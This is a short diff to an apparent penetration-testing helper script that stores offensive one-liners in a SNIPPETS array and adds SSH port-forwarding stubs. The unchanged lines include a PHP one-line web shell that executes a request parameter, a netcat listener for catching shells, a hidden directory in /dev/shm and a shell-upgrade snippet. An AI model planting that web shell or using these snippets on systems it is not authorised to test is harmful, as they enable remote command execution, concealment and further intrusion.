@@ -7,6 +7,9 @@ SNIPPETS["privesc-upgrade-fulltty"]="export TERM=xterm; stty rows 38 columns 116
 SNIPPETS["hdir"]="mkdir '/dev/shm/...'; cd '/dev/shm/...'"
 SNIPPETS["listen-netcat"]="rlwrap nc -nlvp $RANDOM"
 SNIPPETS["php-onliner-shell"]="<?php system($_GET['']); ?>"
+SNIPPETS["forward-ssh-remote"]="ssh -R "
+SNIPPETS["forward-ssh-local"]="ssh -L "
+SNIPPETS["forward-ssh-dynamic"]="ssh -D "
 
 key_value_list=""
 for key in "${!SNIPPETS[@]}"; do
